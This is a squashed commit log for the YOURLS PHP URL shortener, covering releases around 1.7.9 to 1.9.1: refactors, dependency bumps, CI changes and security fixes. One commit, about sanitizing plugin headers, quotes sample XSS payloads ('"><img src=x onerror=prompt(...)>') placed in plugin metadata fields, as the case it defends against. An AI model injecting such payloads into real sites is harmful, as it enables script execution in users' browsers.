Closes #1655

* Validate api.yourls.org result when checking for new version (#2657)

* Bump to 1.7.9

* Bump 1.7.10

* Forbid tests/

Fixes #2664

* Split functions.php in smaller files

New function files for:
* debug
* options
* links
* geo
* shorturls
Fixes #2654

* Regroup and always load auth functions
Fixes #2662
Fixes #2661

Co-authored-by: paulgoodchild <paulgoodchild@users.noreply.github.com>

* Readme tweak (#2671)

* Stop hotlinking images from yourls.org
* Linkable h2 & h3

* Gandi link

[skip travis] [skip scrutinizer]

* Allow 255 chars for the user agent (#2672)

* New/better hooks for referrer and user agent

* Update deps (#2676)

* Begin functions cleaning, starting with GEO. (#2670)

* cleanup geo functions
* add support for CloudFlare's Country GEO header without the need for IP resolution and database
* ensure flag URL always returns a string, instead of false on failure as the result is always used as a string (without validation)
* add helper yours_get_db() so we don't need to use \"global $ydb\" throughout and it ensures that ydb is always initialised correctly and hasn't ever been changed to something incompatible.
* simplify debug get log
* tidy up code and phpdocs for functions-plugins
* cleanup & phpdocs for parts of functions.php
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Smarter keyword sanitization (#2682)

* Smarter keyword sanitizing, based on context
* Deprecate yourls_sanitize_string()

Fixes #2646.
Fixes #2128.

* Update README.md

* Timezones (#2684)

* Implemented support for timezones
* Removed OFFSET const from config
* Localized yet sortable date in admin shorturl list
* Unit tests
* Code cleanup

Co-authored-by: JÃ©rÃ©my K <JeremyKeusters@users.noreply.github.com>

* More flexible plugin headers, and tests

* Correcting minor typo

* Revise yourls_date_i18n() (#2701)

* Revise yourls_date_i18n()
* Remove useless function
* Save one query on each call ð

Fixes #2694

* Reverse build script logic (#2705)

By default simply list what would go, but don't delete anything

* PHPUnit tweaks (#2706)

* Overwrite tests/composer.json with specific phpunit version depending on PHP version
* Send code coverage to scrutinize

* Update README

Actual links to contributing.md

* Readme tweaks

* Moar badges. I love badges.

* Clarify allowed chars in table names & prefixes (#2721)

Fixes #2720

* Fix typos

* Update sample plugin (#2737)

Remove all third party, deprecated or not. Fixes #2736.

* Extend filter-hook \"table_add_row_action_array\"

Closes #2743

* The mac client is deprecated (#2754)

The mac client is deprecated and the link is redirecting to other website (http://timi.im/app/) which looks malicious.

* Update readme.html (#2758)

Add YOURLS installation link for Ubuntu 20.04 version.

Co-authored-by: dgw <dgw@technobabbl.es>

* Fix that effing encoding problem (#2690)

This commit's changelog

- less encode/decode
- update jQuery & remove old ones
- No encoding in JS
- Also, 4 spaces in JS too, duh
- IDN domain functions
- Use mb_ functions to preverse IDN domains
- Support for UTF8MB4
- update install procedure
- update upgrade procedure. Note: The log table will be left untouched by the upgrade, it's impossible to make a convenient upgrade script for thousands of rows. The only problem will be if someone uses UTF8 short URLs (eg `http://sho.rt/Ã©Ã©ð©`)
- Handle normalization of IDN domains & tests
- Fix warning on 7.2 and 7.3
- Deal with encoding in bookmarklets
- Enclose upgrade queries in a transaction
- Force no caching upon install or upgrade. Note: Strange behavior: if YOURLS hosted on an IDN domain, browser (FF at least) caches the redirection from admin/index.php to admin/install.php
- Support for IDN YOURLS hosting
- Tests for IDN YOURLS hosting
- Fix code (that will never get run again)
- Don't cache ajax requests
- Remove unnecessary function call
- Add comment doc block
- More IDN sanitizing tests
- IDN : Screw the \"open dots\". Who's going to type domainãcom instead of domain.com anyway? Seriously. (although these do pass on my dev box)
- Deprecate yourls_lowercase_scheme_domain()
- Update doc to reflect DB change

* On logout, explicitely send to index.php

Fix logout link in admin panel.

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Sanitize plugin file header before display (#2761)

Avoid improbable case such as:

/**
 * Plugin Name: anything\"><img src=x onerror=prompt(\"name\")>
 * Plugin URI: anything\"><img src=x onerror=prompt(\"\")>
 * Description: anything\"><img src=x onerror=prompt(\"desc\")>
 * Version: anything\"><img src=x onerror=prompt('version')>
 * Author: anything\"><img src=x onerror=prompt('author')>
 * Author URI: anything\"><img src=x onerror=prompt(\"desc\")>
 */

* Remove `global $ydb` calls and prefer helper function (#2762)

Fixes #2698

Changes :
- Replace all global $ydb; and $ydb->... with yourls_get_db()-> in code and tests
- Add tests
- Introduce yourls_set_db()

* Replace `call_user_func()` with variable functions (#2763)

Fixes #2714

* Display default shorturls_length in the database if not already set (#2767)

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update XML lib for API output (#2770)

Will close #2668

* Add verifications for exception messages in tests (#2780)

* Add WhatsApp and Telegram Protocols (#2781)

* Fix typo broken in #2781 (#2786)

* Update clipboard.js to 2.0.6 (#2788)

Internal breaking change : js constructor from `new Clipboard()` to `new ClipboardJS()`

Signed-off-by: Aaron <admin@datahoarder.dev>

* optional `$title` param in `yourls_table_add_row()` can't be optional (#2808)

PHP 8.0 deprecated optional parameters before required ones:
https://php.watch/versions/8.0/deprecate-required-param-after-optional

All call sites in YOURLS already pass `$title` (because they have to),
so there's no reason it needs to be an optional argument. This change
resolves part of #2807.

Additionally, the first line of `yourls_table_add_row()` was indented
with spaces instead of using s tab character like the rest of the file.
This has been corrected as a bonus.

* Update tests matrix and setup

* Update travis for composer 2
* Update xdebug.mode in php.ini
* Bump PHPUnit versions for PHP 8 and nightly
* Remove 5.6

* Replace double quotes with single quotes, preventing fatal exception when running on MySQL 8 (#2800)

Fixes #2799

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update Travis badge

[skip ci] [skip travis]

* Update libs and fix PHP 8 (#2824)

Fixes #2807

* Update libs
* Refactor the logging system to match Aura SQL 3
* Bump PHPUnit version
* Downgrade spatie/array-to-xml to 2.15
* Upgrade expectations to PHPUnit 8+
* Drop PHPUnit 6 support

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Move to GitHub Actions (#2828)

* Move to GitHub Actions
* Switch badges to GitHub Actions
* Add dependabot for github-actions actions

* SVG icons (#2822)

Co-authored-by: Ozh <ozh@ozh.org>

* Update readme.html (#2823)

Added a new detailed tutorial for LEMP+Let's Encrypt

* SVG logo and icon as designed by @JayHoltslander (#2837)

Co-authored-by: Jay Holtslander <j.holtslander@gmail.com>

* Disable 8.1  (#2838)

Disable 8.1 run as allow run failure not available

* Use short array syntax (#2839)

* Revert enclosing in transaction

Fixes #2827

* Fix collation in the update to current master (#2840)

* Fix collation in the update. Bump DB to 506.
* Fixes #2766

* Bump min PHP requirement (#2841)

* Readme cleanup (#2842)

Remove all unofficial links, now to be found on https://github.com/YOURLS/awesome-yourls

* 1.8, baby

* Update CHANGELOG.md

Adding 1.8 and 1.7.9 that was forgotten

* Add missing escapes characters to MySQL query in functions-upgrade.php (#2844)

* Bump shivammathur/setup-php from 2.9.0 to 2.10.0 (#2847)

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.9.0 to 2.10.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.9.0...fa18c2b29fb5bc1e52e8cf211aad2aaa9b79d232)

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Create labeler.yml

* Create label-commenter-config.yml

* Fix branch name in actions

* Update collation on install (#2846)

* Fix is_private overruling (#2859)

* Fix is_private overruling
* Simplify function yourls_is_private

* Support for 'all' hook (#2860)

* Improve inline doc & comments
* Introduce support for the 'all' hook
* Unit test nitpicking

* 1.8.1 changelog

[skip ci]

* Bump for 1.8.1

[skip ci]

* Fix SVG for IE 11 (#2864)

* Add viewBox attribute to favicon
* Logo missing viewBox as well

* Add a release workflow to dispatch to Docker repo

* Promote GitHub Discussions for community support

* Promote awesome-yourls

* Bump shivammathur/setup-php from 2.10.0 to 2.11.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.10.0 to 2.11.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.10.0...b0559f7f8eaf458ae85a7bb2f83b25d37211160e)

Signed-off-by: dependabot[bot] <support@github.com>

* Bump rmccue/requests from 1.7.0 to 1.8.0 (#2916)

Bumps [rmccue/requests](https://github.com/rmccue/Requests) from 1.7.0 to 1.8.0.
- [Release notes](https://github.com/rmccue/Requests/releases)
- [Changelog](https://github.com/WordPress/Requests/blob/master/CHANGELOG.md)
- [Commits](https://github.com/rmccue/Requests/compare/v1.7.0...v1.8.0)

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Refactor admin/index.php & more filters (#2912)

* Move some logic from admin/index.php to own class
* Comments & documentation

* Clarify what setting is for

Wiki page added: https://yourls.org/urlconvert
For the lolz, here are the values for this setting encountered in the wild: https://gist.github.com/ozh/46056801ee25b9f328334b3ce0e32f1b

[skip ci]

* Bump peter-evans/create-pull-request from 3 to 3.9.1

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3 to 3.9.1.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3...v3.9.1)

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2 to 2.3.4

Bumps [actions/checkout](https://github.com/actions/checkout) from 2 to 2.3.4.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2...v2.3.4)

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peaceiris/actions-label-commenter from 1 to 1.9.1

Bumps [peaceiris/actions-label-commenter](https://github.com/peaceiris/actions-label-commenter) from 1 to 1.9.1.
- [Release notes](https://github.com/peaceiris/actions-label-commenter/releases)
- [Changelog](https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md)
- [Commits](https://github.com/peaceiris/actions-label-commenter/compare/v1...v1.9.1)

Signed-off-by: dependabot[bot] <support@github.com>

* bugfix/db upgrade 506 (#2933)

* fix duplicate array key
* convert url table *after* changing field length to avoid \"key was too long; max key length is 767 bytes\" error on some DB setups

* Bump peter-evans/create-pull-request from 3.9.1 to 3.9.2 (#2942)

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.9.1 to 3.9.2.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.9.1...v3.9.2)

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peter-evans/create-pull-request from 3.9.2 to 3.10.0

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.9.2 to 3.10.0.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.9.2...v3.10.0)

Signed-off-by: dependabot[bot] <support@github.com>

* Filter all HTTP request params (#2951)

* Add `version` to API usage

Closes #2957

[skip ci]

* Bump peaceiris/actions-label-commenter from 1.9.1 to 1.9.2 (#2980)

Bumps [peaceiris/actions-label-commenter](https://github.com/peaceiris/actions-label-commenter) from 1.9.1 to 1.9.2.
- [Release notes](https://github.com/peaceiris/actions-label-commenter/releases)
- [Changelog](https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md)
- [Commits](https://github.com/peaceiris/actions-label-commenter/compare/v1.9.1...v1.9.2)

---
updated-dependencies:
- dependency-name: peaceiris/actions-label-commenter
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peaceiris/actions-label-commenter from 1.9.2 to 1.10.0

Bumps [peaceiris/actions-label-commenter](https://github.com/peaceiris/actions-label-commenter) from 1.9.2 to 1.10.0.
- [Release notes](https://github.com/peaceiris/actions-label-commenter/releases)
- [Changelog](https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md)
- [Commits](https://github.com/peaceiris/actions-label-commenter/compare/v1.9.2...v1.10.0)

---
updated-dependencies:
- dependency-name: peaceiris/actions-label-commenter
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.11.0 to 2.12.0 (#2996)

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.11.0 to 2.12.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.11.0...2.12.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.12.0 to 2.13.0 (#3032)

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.12.0 to 2.13.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.12.0...2.13.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peter-evans/create-pull-request from 3.10.0 to 3.10.1 (#3029)

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.10.0 to 3.10.1.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.10.0...v3.10.1)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Minor security improvements (#3034)

* Prevent iframe jacking
* Enforce nonce on admin login screen

* Bump version and update changelog

[skip ci]

* Update auth tests to match #3034 (#3035)

* Minor security improvements #2 (#3041)

* Escape HTML and attributes before returning
* Remove deprecated vars

* Prevent encryption warning when password provided via env (#3040)

Fixes #3038

* added check for user provided from environment variables
* Add unit tests

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Support HTTPS termination on a reverse proxy (#3044)

When HTTPS termination happens on a reverse proxy, $_SERVER['HTTPS'] is not set and $_SERVER['SERVER_PORT'] is 80.
The current implementation tries to redirect infinitely in this situation because the function yourls_is_ssl() is false, although the actual URL begins with https://.

* Filterable user defined constants, and more tests (#3048)

* Test referrer parsing

* Update CHANGELOG.md

* Post release bump. Onto the next version!

[skip ci]

* Use PAT in workflow to allow chaining

* Sanitize user input in upgrade (#3055)

* Bump shivammathur/setup-php from 2.13.0 to 2.14.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.13.0 to 2.14.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.13.0...2.14.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Remove labeler as per template enforcement

* Enable auto-merge for dependabot

* Enable auto-merge for dependabot

* Bump shivammathur/setup-php from 2.14.0 to 2.15.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.14.0 to 2.15.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.14.0...2.15.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2.3.4 to 2.3.5

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.3.4 to 2.3.5.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.3.4...v2.3.5)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Remove explicit matrix tag in workflow name

Let GitHub auto tag jobs and make them more generic

* Fix incorrect \"prefix and shorten\" notice while logged out

Fixes #2688

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Automatic PR for Helm charts after a release

* Fix workflow file

[ci skip]

* Bump actions/checkout from 2.3.5 to 2.4.0

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.3.5 to 2.4.0.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.3.5...v2.4.0)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peter-evans/create-pull-request from 3.10.1 to 3.11.0

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.10.1 to 3.11.0.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.10.1...v3.11.0)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.15.0 to 2.16.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.15.0 to 2.16.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.15.0...2.16.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peter-evans/create-pull-request from 3.11.0 to 3.12.0

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.11.0 to 3.12.0.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.11.0...v3.12.0)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Revert 3090 & fix tests (#3188)

* Allow prefix n shortening without being logged in

Fixes #3189

- Allow prefix n shortening without being logged in
- Test checking for redirection on successful auth

Props @dan-r for the initial digging on this issue !

* Update GeoIP db (#3191)

* Update GeoIP2 db
* Update tests

Fixes #3173

* Bump peter-evans/create-pull-request from 3.12.0 to 3.12.1

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.12.0 to 3.12.1.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.12.0...v3.12.1)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.16.0 to 2.17.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.16.0 to 2.17.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.16.0...2.17.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Reuse org workflows

* Drop release workflows

The relative actions has been moved to downstream to simplify maintenance

* Updated default links from 'http' to 'https' (#3229)

* Updated default links from 'http' to 'https'
* Updated unit test

* Bump to php 8.1 and drop 7.2, 7.3 (#3230)

* Bump tests to php 8.1 and drop 7.2, 7.3
* Bump vendor version to align with new requirements
* Drop conflicted and deprecated YDB functions
* Use proper Request namespace
* Fix a deprecation warning

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update .gitattributes

* Clean up gitattributes

* Mark vendor files as generated

* Remove ozh/phpass and use on password_* functions (#3232)

Fixes #3231

* Bump shivammathur/setup-php from 2.17.0 to 2.17.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.17.0 to 2.17.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.17.0...2.17.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2.4.0 to 3

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.4.0 to 3.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.4.0...v3)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-major
...

Signed-off-by: dependabot[bot] <support@github.com>

* Upload coverage only when coverage is enabled

ref https://github.com/YOURLS/YOURLS/issues/3238

* Try and catch concurrency errors (#3233)

* Try and catch concurrency errors when creating new short urls, updating click count and logging redirects
* Code refactoring
* Couple more tests while at it

Fixes #2538
Fixes #765
Fixes #1974
Fixes #2829

* Remove scrutinizer (#3245)

* Make element ID independent from the short URL (#3244)

Fixing a dumb idea introduced in version 0.1 :^P

Fixes #2925

* Restore certificates (#3250)

* Restore certificates
* Make sure to test againts HTTPS so this won't happen again

* Explicitely exit after redirection where needed (#3257)

Fixes #3217
Would fix #2688 if it weren't already fixed

* Bump shivammathur/setup-php from 2.17.1 to 2.18.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.17.1 to 2.18.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.17.1...2.18.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Add nonce to the logout link (#3264)

* Add nonce to the logout link
* Add tests for cookies being set or reset
* More tests: check nonces are different for different actions & users

Fixes #3170

* More hooks for the admin view & search (#3265)

Will fix #3074 and #3262

* Plugin API : sandbox and uninstall procedure (#3258)

- foolproof (?) activation sandbox that actually works
- uninstall method
- Plugin activation sandbox and unit tests
- Uninstall script and tests

* Update version checking and use /version/1.1/ (#3268)

* Fix typo

[skip ci]

* Do not use md5() in yourls_salt() (#3278)

* Do not use md5() in yourls_salt()
* More tests while we're here

Fixes #3277

* Bump shivammathur/setup-php from 2.18.0 to 2.18.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.18.0 to 2.18.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.18.0...2.18.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* More plugin functions (#3281)

Introduce yourls_get_actions() and yourls_get_filters(), and their tests

* Update certificates (#3283)

Co-authored-by: ozh <ozh@ozh.org>

* Regularly update certificates (#3282)

Workflow to update cacert every monday if a new bundle is published

* Update GeoIP DB (#3289)

Co-authored-by: ozh <ozh@ozh.org>

* Regularly update GeoIP db (#3284)

Regularly update GeoIP db
Workflow to update geoip db every monday if a new version is available

* More checks with new version notices (#3290)

* add unit tests to make sure running 1.8.3-dev will trigger a new version notice when 1.8.3 is out (I think it already works this way)
* more validation of the api core/update response

* Promote docs.yourls.org (#3291)

* Don't delete branch when closing `update-geoip` PR (#3294)

* Update GeoIP with Github App (#3298)

* Update GeoIP with Github App
Source: https://github.com/peter-evans/create-pull-request/blob/main/docs/concepts-guidelines.md#authenticating-with-github-app-generated-tokens

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Update GeoIP DB (#3303)

Co-authored-by: ozh <ozh@ozh.org>

* More helpful \"URL already exists\" (#3305)

Fixes #1676 opened by... myself... 8 years ago ð

* 1.9 (#3304)

Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Post release bump

* Bump dependencies and remove (#3309)

Updates :
- aura/sql (3.0.0 => 3.1.0)
- maxmind/web-service-common (v0.8.1 => v0.9.0)
- rmccue/requests (v2.0.1 => 2.0.2)
- symfony/polyfill-intl-idn (v1.24.0 => v1.25.0)
- symfony/polyfill-intl-normalizer (v1.24.0 => v1.25.0)
- symfony/polyfill-mbstring (v1.24.0 => v1.25.0)
- symfony/polyfill-php72 (v1.24.0 => v1.25.0)

* Fix checking for new certs (#3313)

Stop fighthing with the etags, just download the darn files

* Update GeoIP DB (#3315)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update certificates (#3316)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Remove warnings on PHP 8.1 (#3317)

Also, minor code styles doc & typo
* Refactor yourls_filter_unique_id() to remove useless vars
* Comply with phpstan level 4
* add some tests to cover newly discovered potential issues

* Add missing inline documentation (#3325)

* Inline documentation (#3329)

Now 100% complete

* Fix error `Undefined constant \"intval\"` when upgrading (#3332)

Closes #3331

* Update GeoIP DB (#3334)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3340)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* List required/suggested PHP extensions in composer.json (#3339)

* List required/suggested PHP extensions in composer.json

Best-effort attempt to declare all extensions used by YOURLS.

Based on the output of https://github.com/RogerGee/php-ext-depends

`composer check-platform-reqs` will show the status of all except those
in \"suggest\", which is a limitation to sort out later.

* Update composer.json extension requirements after further research

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB (#3348)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* No hyphen in random keywords (#3353)

Fixes  #2281
Fixes YOURLS/random-keywords#8

* Always include `functions-(upgrade|install).php` (#3354)

Fixes #3326

* Return 400 instead of 500 when duplicate (#3355)

Fixes #3319

* Update GeoIP DB (#3356)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Release v1.9.1 (#3350)

* Version 1.9.1
Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Post release bump

* Bump shivammathur/setup-php from 2.18.1 to 2.19.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.18.1 to 2.19.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.18.1...2.19.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.19.0 to 2.19.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.19.0 to 2.19.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.19.0...2.19.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3362)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Fix geoip tests with a more confident ipv6 (#3369)

This one is in Japan according to all tools I could check

* Update GeoIP DB (#3368)

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB (#3370)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.19.1 to 2.20.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.19.1 to 2.20.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.19.1...2.20.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.20.0 to 2.20.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.20.0 to 2.20.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.20.0...2.20.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3373)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.20.1 to 2.21.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.20.1 to 2.21.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.20.1...2.21.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3385)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.21.0 to 2.21.1

